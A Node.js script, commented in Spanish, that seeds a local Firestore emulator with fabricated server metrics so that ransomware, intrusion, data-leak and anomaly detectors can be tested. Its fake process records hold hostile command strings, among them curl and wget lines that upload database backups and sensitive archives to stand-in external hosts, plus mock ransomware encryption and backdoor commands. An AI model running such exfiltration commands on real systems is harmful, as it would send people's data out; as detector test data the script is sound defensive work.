/**
 * Script para simular diferentes tipos de ciberataques
 * Esto crea métricas sospechosas que los detectores deberían identificar
 * 
 * Ejecutar con: node scripts/simulate-attack.js [tipo]
 * 
 * Tipos disponibles:
 * - ransomware: Simula un ataque de ransomware
 * - intrusion: Simula intentos de intrusión
 * - data-leak: Simula filtración de datos
 * - anomaly: Simula comportamiento anómalo
 * - all: Simula todos los ataques
 */

import { initializeApp } from 'firebase/app';
import {
  getFirestore,
  collection,
  getDocs,
  addDoc,
  Timestamp,
  connectFirestoreEmulator,
} from 'firebase/firestore';
import { ensureAllData } from './helpers/ensure-data.js';
import { detectAndCreateAlerts } from './helpers/detect-and-create-alerts.js';

const firebaseConfig = {
  apiKey: 'demo-api-key',
  authDomain: 'demo-project.firebaseapp.com',
  projectId: 'demo-lincoln',
  storageBucket: 'demo-lincoln.appspot.com',
  messagingSenderId: '123456789',
  appId: '1:123456789:web:abcdef123456',
};

console.log('🔥 Inicializando Firebase...');
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

console.log('🔌 Conectando a emuladores...');
connectFirestoreEmulator(db, 'localhost', 8082);
console.log('✅ Conectado a emuladores\n');

// Obtener tipo de ataque desde argumentos
const attackType = process.argv[2] || 'all';

async function simulateAttack() {
  try {
    // Verificar y crear datos necesarios si no existen
    const { servers: availableServers } = await ensureAllData(db);
    
    // Obtener servidores activos
    const servers = availableServers.filter((s) => s.isActive && s.status === 'online');

    if (servers.length === 0) {
      console.log('⚠️  No hay servidores activos para atacar');
      return;
    }

    const targetServer = servers[0]; // Usar el primer servidor activo
    console.log(`🎯 Servidor objetivo: ${targetServer.name} (${targetServer.id})\n`);

    const now = new Date();
    const timestamp = Timestamp.fromDate(now);

    if (attackType === 'ransomware' || attackType === 'all') {
      console.log('💀 Simulando ATAQUE DE RANSOMWARE...');
      
      const ransomwareMetrics = {
        cpuUsage: 95, // Alto - específico para ransomware (puede activar anomalías también)
        memoryUsage: 88, // Alto - específico para ransomware
        diskUsage: 75,
        networkIn: 30 * 1024 * 1024, // 30 MB (bajo para evitar data-leak, umbral >100MB)
        networkOut: 20 * 1024 * 1024, // 20 MB (bajo para evitar data-leak, umbral >100MB)
        activeConnections: 20, // Moderado
        failedLoginAttempts: 0, // Sin intentos fallidos para evitar detección de intrusión
        processes: [
          {
            pid: 6666,
            name: 'crypt.exe',
            cpuUsage: 80,
            memoryUsage: 25,
            command: 'crypt.exe --encrypt --target /var/www --key ransom_key_2024',
            user: 'unknown',
            startTime: timestamp,
          },
          {
            pid: 6667,
            name: 'locky.exe',
            cpuUsage: 15,
            memoryUsage: 10,
            command: 'locky.exe --spread --network',
            user: 'unknown',
            startTime: timestamp,
          },
        ],
        fileChanges: Array.from({ length: 100 }, (_, i) => ({
          path: `/var/www/important_file_${i}.txt.encrypted`,
          action: 'created',
          size: Math.floor(Math.random() * 10000) + 1000,
          timestamp: timestamp,
          user: 'unknown',
        })),
        networkConnections: [
          {
            protocol: 'tcp',
            localAddress: targetServer.ipAddress || '192.168.1.10',
            localPort: 443,
            remoteAddress: '185.220.101.45', // IP sospechosa
            remotePort: 443,
            state: 'ESTABLISHED',
            processName: 'crypt.exe',
            timestamp: timestamp,
          },
        ],
        timestamp: timestamp,
      };

      await addDoc(
        collection(db, 'servers', targetServer.id, 'metrics'),
        ransomwareMetrics
      );
      console.log('   ✅ Métricas de ransomware creadas');
      console.log('   ⚠️  Detectores deberían identificar:');
      console.log('      - Proceso sospechoso: crypt.exe');
      console.log('      - Proceso sospechoso: locky.exe');
      console.log('      - 100 archivos encriptados\n');
    }

    if (attackType === 'intrusion' || attackType === 'all') {
      console.log('🔓 Simulando INTENTO DE INTRUSIÓN...');
      
      // Métricas específicas para intrusión: bajo uso de recursos, muchas conexiones fallidas
      // Diseñadas para activar SOLO el detector de intrusión
      const intrusionMetrics = {
        cpuUsage: 30, // Bajo para evitar detección de anomalías (umbral: >90%)
        memoryUsage: 40, // Bajo para evitar detección de anomalías (umbral: >90%)
        diskUsage: 55,
        networkIn: 20 * 1024 * 1024, // 20 MB (bajo para evitar data-leak, umbral: >100MB)
        networkOut: 2 * 1024 * 1024, // 2 MB (muy bajo para evitar data-leak, umbral: >100MB)
        activeConnections: 25, // Moderado, pero sin muchas conexiones establecidas simultáneas
        failedLoginAttempts: 25, // Muchos intentos fallidos - principal indicador de intrusión
        processes: [
          {
            pid: 7777,
            name: 'sshd',
            cpuUsage: 15, // Bajo uso individual
            memoryUsage: 3, // Bajo uso individual
            command: '/usr/sbin/sshd -D',
            user: 'root',
            startTime: timestamp,
          },
        ],
        fileChanges: [], // Sin cambios de archivos para evitar detección de ransomware
        networkConnections: Array.from({ length: 25 }, (_, i) => ({
          protocol: 'tcp',
          localAddress: targetServer.ipAddress || '192.168.1.10',
          localPort: 22, // SSH - puerto sospechoso para intrusión
          remoteAddress: `203.45.67.${80 + i}`, // IPs externas múltiples - patrón de intrusión
          remotePort: 54321 + i,
          state: 'SYN_SENT', // Estado sospechoso de conexión
          processName: 'sshd',
          timestamp: timestamp,
        })),
        timestamp: timestamp,
      };

      await addDoc(
        collection(db, 'servers', targetServer.id, 'metrics'),
        intrusionMetrics
      );
      console.log('   ✅ Métricas de intrusión creadas');
      console.log('   ⚠️  Detectores deberían identificar:');
      console.log('      - 25 intentos de login fallidos');
      console.log('      - 25 conexiones sospechosas desde IPs externas\n');
    }

    if (attackType === 'data-leak' || attackType === 'all') {
      console.log('📤 Simulando FILTRACIÓN DE DATOS...');
      
      const dataLeakMetrics = {
        cpuUsage: 70,
        memoryUsage: 75,
        diskUsage: 65,
        networkIn: 10 * 1024 * 1024, // 10 MB
        networkOut: 500 * 1024 * 1024, // 500 MB (muy sospechoso - umbral >100MB)
        activeConnections: 5, // Bajo para evitar detección de anomalías
        failedLoginAttempts: 0, // Sin intentos fallidos para evitar detección de intrusión
        processes: [
          {
            pid: 8888,
            name: 'curl',
            cpuUsage: 40,
            memoryUsage: 15,
            command: 'curl -T large_database_backup.zip https://suspicious-server.com/upload',
            user: 'app',
            startTime: timestamp,
          },
          {
            pid: 8889,
            name: 'wget',
            cpuUsage: 30,
            memoryUsage: 10,
            command: 'wget --post-file=sensitive_data.tar.gz http://external-api.com/endpoint',
            user: 'app',
            startTime: timestamp,
          },
        ],
        fileChanges: [],
        networkConnections: [
          {
            protocol: 'tcp',
            localAddress: targetServer.ipAddress || '192.168.1.10',
            localPort: 443,
            remoteAddress: '104.16.132.229', // IP externa
            remotePort: 443,
            state: 'ESTABLISHED',
            processName: 'curl',
            timestamp: timestamp,
          },
          {
            protocol: 'tcp',
            localAddress: targetServer.ipAddress || '192.168.1.10',
            localPort: 80,
            remoteAddress: '172.67.132.100', // Otra IP externa
            remotePort: 80,
            state: 'ESTABLISHED',
            processName: 'wget',
            timestamp: timestamp,
          },
        ],
        timestamp: timestamp,
      };

      await addDoc(
        collection(db, 'servers', targetServer.id, 'metrics'),
        dataLeakMetrics
      );
      console.log('   ✅ Métricas de filtración creadas');
      console.log('   ⚠️  Detectores deberían identificar:');
      console.log('      - Transferencia masiva: 500 MB salientes');
      console.log('      - Conexiones a servidores externos sospechosos\n');
    }

    if (attackType === 'anomaly' || attackType === 'all') {
      console.log('⚠️  Simulando COMPORTAMIENTO ANÓMALO...');
      
      const anomalyMetrics = {
        cpuUsage: 98, // Muy alto
        memoryUsage: 96, // Muy alto
        diskUsage: 85,
        networkIn: 200 * 1024 * 1024, // 200 MB
        networkOut: 150 * 1024 * 1024, // 150 MB
        activeConnections: 100,
        failedLoginAttempts: 0,
        processes: [
          {
            pid: 9999,
            name: 'unknown_malicious_process',
            cpuUsage: 85,
            memoryUsage: 40,
            command: 'unknown_malicious_process --stealth --mining',
            user: 'unknown',
            startTime: timestamp,
          },
          {
            pid: 10000,
            name: 'suspicious_daemon',
            cpuUsage: 10,
            memoryUsage: 50,
            command: 'suspicious_daemon --backdoor --persist',
            user: 'root',
            startTime: timestamp,
          },
        ],
        fileChanges: Array.from({ length: 50 }, (_, i) => ({
          path: `/tmp/suspicious_file_${i}.tmp`,
          action: 'created',
          size: Math.floor(Math.random() * 5000) + 500,
          timestamp: timestamp,
          user: 'unknown',
        })),
        networkConnections: Array.from({ length: 50 }, (_, i) => ({
          protocol: 'tcp',
          localAddress: targetServer.ipAddress || '192.168.1.10',
          localPort: 8000 + i,
          remoteAddress: `10.0.0.${i + 1}`,
          remotePort: 443,
          state: 'ESTABLISHED',
          processName: 'unknown_malicious_process',
          timestamp: timestamp,
        })),
        timestamp: timestamp,
      };

      await addDoc(
        collection(db, 'servers', targetServer.id, 'metrics'),
        anomalyMetrics
      );
      console.log('   ✅ Métricas de anomalía creadas');
      console.log('   ⚠️  Detectores deberían identificar:');
      console.log('      - CPU: 98% (muy alto)');
      console.log('      - Memoria: 96% (muy alto)');
      console.log('      - Procesos desconocidos ejecutándose\n');
    }

    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('✅ SIMULACIÓN DE ATAQUE COMPLETADA');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
    
    console.log('💡 Próximos pasos:');
    console.log('   1. Ejecuta detecciones manualmente desde el Dashboard:');
    console.log('      - Abre el Dashboard: http://localhost:3000/dashboard');
    console.log('      - Haz clic en el botón "Ejecutar Detección Manual"');
    console.log('   2. O ejecuta detecciones desde la línea de comandos:');
    console.log('      node scripts/run-detection-create-alerts.js');
    console.log('   3. Las alertas aparecerán automáticamente en el Dashboard');
    console.log('   4. Verifica las alertas en: http://localhost:4001/firestore');
    console.log('   5. Para verificar el estado completo del sistema:');
    console.log('      node scripts/check-detection-status.js\n');
  } catch (error) {
    console.error('❌ Error simulando ataque:', error);
    throw error;
  }
}

simulateAttack()
  .then(() => {
    process.exit(0);
  })
  .catch((error) => {
    console.error('❌ Error:', error);
    process.exit(1);
  });

